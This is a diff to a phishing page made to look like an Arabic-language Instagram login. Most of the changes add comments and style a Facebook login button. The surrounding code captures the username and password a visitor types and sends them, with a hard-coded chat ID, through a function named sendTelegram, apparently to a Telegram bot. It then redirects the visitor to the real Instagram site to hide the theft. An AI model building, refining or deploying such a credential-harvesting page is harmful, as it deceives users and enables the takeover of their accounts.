@@ -13,20 +13,20 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            direction: rtl; 
+            direction: rtl; /* اتجاه النصوص من اليمين لليسار */
         }
         .login-container {
             background-color: #fff;
             border: 1px solid #dbdbdb;
             padding: 20px;
-            width: 90%; 
-            max-width: 360px; 
+            width: 90%; /* تقليل العرض ليكون مناسبًا للشاشات الصغيرة */
+            max-width: 360px; /* تحديد عرض أقصى يناسب الهواتف */
             text-align: center;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             border-radius: 8px;
         }
         .login-container img {
-            width: 150px; 
+            width: 150px; /* تقليل حجم الشعار ليتناسب مع الهواتف */
             margin-bottom: 20px;
         }
         input[type="text"], input[type="password"] {
@@ -36,16 +36,16 @@
             border: 1px solid #dbdbdb;
             border-radius: 5px;
             font-size: 16px;
-            text-align: right; 
+            text-align: right; /* محاذاة النصوص لليمين */
         }
         .login-options {
-            margin: 10px 0; 
-            text-align: center; 
+            margin: 10px 0; /* المسافة بين الحقول */
+            text-align: center; /* محاذاة النصوص في الوسط */
         }
         .login-options a {
             color: #3897f0;
             text-decoration: none;
-            font-size: 16px; 
+            font-size: 16px; /* تكبير حجم النص */
         }
         button {
             width: 100%;
@@ -56,7 +56,7 @@
             border-radius: 5px;
             cursor: pointer;
             font-size: 16px;
-            margin-top: 10px; 
+            margin-top: 10px; /* المسافة بين الحقول وزر "تسجيل الدخول" */
         }
         button:hover {
             background-color: #318ce7;
@@ -66,9 +66,23 @@
             color: #fff;
             font-weight: bold;
             margin-top: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 12px 0;
+            border-radius: 5px;
+            border: none;
+        }
+        .facebook-login img {
+            width: 20px; /* حجم الأيقونة صغير */
+            height: 20px; /* جعل الأيقونة مربعة */
+            margin-right: 10px; /* المسافة بين الأيقونة والنص */
+        }
+        .facebook-login span {
+            font-size: 14px; /* تصغير حجم النص */
         }
         .footer {
-            margin-top: 30px; 
+            margin-top: 30px; /* زيادة المسافة بين النصوص الأخرى و"أليس لديك حساب؟" */
             font-size: 14px;
             color: #8e8e8e;
         }
@@ -82,7 +96,10 @@
 
 <div class="login-container">
     <img src="https://github.com/9wps/Instagramgrob/blob/main/inst.png" alt="Instagram Logo">
-    <button class="facebook-login">متابعة بحساب فيسبوك</button>
+    <button class="facebook-login">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Icon">
+        <span>متابعة بحساب فيسبوك</span>
+    </button>
     <div class="login-options">أو</div>
     <form id="loginForm" method="POST">
         <input type="hidden" name="chat_id" value="1900509620">
@@ -101,7 +118,7 @@
 
 <script>
     function sendTelegram(event) {
-        event.preventDefault();  //
+        event.preventDefault();  // منع إرسال النموذج افتراضيًا
 
         var username = document.getElementById('username').value;
         var password = document.getElementById('password').value;
@@ -112,7 +129,7 @@
         xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
         xhr.send("chat_id=1900509620&text=" + encodeURIComponent(message));
 
-        // 
+        // إعادة التوجيه إلى موقع إنستجرام بعد الإرسال
         xhr.onload = function() {
             window.location.href = "https://www.instagram.com";
         };
